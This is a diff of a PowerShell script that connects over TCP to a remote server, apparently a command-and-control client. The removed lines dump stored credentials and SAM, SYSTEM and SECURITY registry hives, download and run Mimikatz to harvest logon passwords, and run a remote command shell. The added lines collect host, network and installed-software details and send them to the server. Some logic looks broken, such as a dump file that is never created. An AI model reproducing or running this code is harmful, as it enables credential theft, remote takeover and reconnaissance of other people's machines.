@@ -13,7 +13,7 @@ $stream = $tcpClient.GetStream()
 $writer = [System.IO.StreamWriter]::new($stream)
 $reader = [System.IO.StreamReader]::new($stream)
 
-# Writes a string to the server
+# Function to write a string to the server
 function WriteToStream ($String) {
     # Write to the server
     $writer.WriteLine($String)
@@ -21,83 +21,46 @@ function WriteToStream ($String) {
 }
 
 # Function to execute commands and send output to the server
-function ExecuteCommandAndSendOutput($Command) {
-    # Execute command and save output (including errors thrown)
-    $Output = try {
-        Invoke-Expression $Command 2>&1 | Out-String
-    } catch {
-        $_ | Out-String
+
+
+# Function to gather system information and send to server
+function GatherAndSendSystemInfo() {
+    # Get system information
+    $systemInfo = Get-WmiObject Win32_ComputerSystem
+    $osInfo = Get-WmiObject Win32_OperatingSystem
+    $cpuInfo = Get-WmiObject Win32_Processor
+    $memoryInfo = Get-WmiObject Win32_PhysicalMemory
+
+    # Get network information
+    $networkInfo = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
+
+    # Get installed software information
+    $installedSoftware = Get-WmiObject Win32_Product | Select-Object Name, Version
+
+    # Construct system information message
+    $systemInfoMsg = @"
+System Information:
+  Model: $($systemInfo.Model)
+  Manufacturer: $($systemInfo.Manufacturer)
+  OS: $($osInfo.Caption) $($osInfo.Version)
+  CPU: $($cpuInfo.Name)
+  Memory: $($memoryInfo.Capacity / 1GB) GB
+
+Network Information:
+"@
+    foreach ($adapter in $networkInfo) {
+        $systemInfoMsg += "  Adapter: $($adapter.Description)`n"
+        $systemInfoMsg += "    IP Address: $($adapter.IPAddress)`n"
     }
-    
-    # Write output to the server
-    WriteToStream ($Output)
+
+    $systemInfoMsg += "`nInstalled Software:`n"
+    foreach ($software in $installedSoftware) {
+        $systemInfoMsg += "  $($software.Name) $($software.Version)`n"
+    }
+
+    # Send system information to server
+    WriteToStream $systemInfoMsg
 }
-
-# Function to check for stored credentials and send to the server
-function CheckStoredCredentials {
-    ExecuteCommandAndSendOutput "Get-StoredCredential | Format-List"
-}
-
-# Function to dump password hashes from the SAM database and send to the server
-function DumpPasswordHashes {
-    # Dump password hashes from the SAM database
-    reg save HKLM\SYSTEM $env:TEMP\system.sav
-    reg save HKLM\SAM $env:TEMP\sam.sav
-    reg save HKLM\SECURITY $env:TEMP\security.sav
-
-    # Use Mimikatz to extract password hashes from the SAM database
-    $mimikatzDir = "$env:TEMP\mimikatz_trunk"
-    $mimikatzZip = "$env:TEMP\mimikatz.zip"
-    $mimikatzUrl = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210804/mimikatz_trunk.zip"
-    Invoke-WebRequest $mimikatzUrl -OutFile $mimikatzZip
-    Expand-Archive $mimikatzZip -DestinationPath $env:TEMP
-    $dump = . "$mimikatzDir\x64\mimikatz.exe" "privilege::debug" "sekurlsa::minidump $env:TEMP\lsass.dmp" "sekurlsa::logonpasswords" "exit"
-    Remove-Item "$env:TEMP\lsass.dmp" -Force
-    Remove-Item "$env:TEMP\system.sav" -Force
-    Remove-Item "$env:TEMP\sam.sav" -Force
-    Remove-Item "$env:TEMP\security.sav" -Force
-    
-    # Send dump output to the server
-    WriteToStream $dump
-}
-
-# Send stored credentials to the server
-WriteToStream "Stored Credentials:`n"
-CheckStoredCredentials
-
-# Send password hashes to the server
-WriteToStream "Password Hashes:`n"
-DumpPasswordHashes
-
-function WriteShell ($String) {
-    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
-    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
-
-    # Write to C2
-    $writer.Write($String + 'SHELL> ')
-    $writer.Flush()
-}
-
-# Initial output to C2. The function also creates the inital empty byte array buffer used below.
-WriteShell ''
-
-# Loop that breaks if stream.Read throws an exception - will happen if connection is closed.
-while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
-    # Encode command, remove last byte/newline
-    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-    
-    # Execute command and save output (including errors thrown)
-    $Output = try {
-            Invoke-Expression $Command 2>&1 | Out-String
-        } catch {
-            $_ | Out-String
-        }
-
-    # Write output to C2
-    WriteShell ($Output)
-}
-# Closes the writer and the underlying TCPClient
-$writer.Close()
 
 # Initial output to the server
 WriteToStream ""
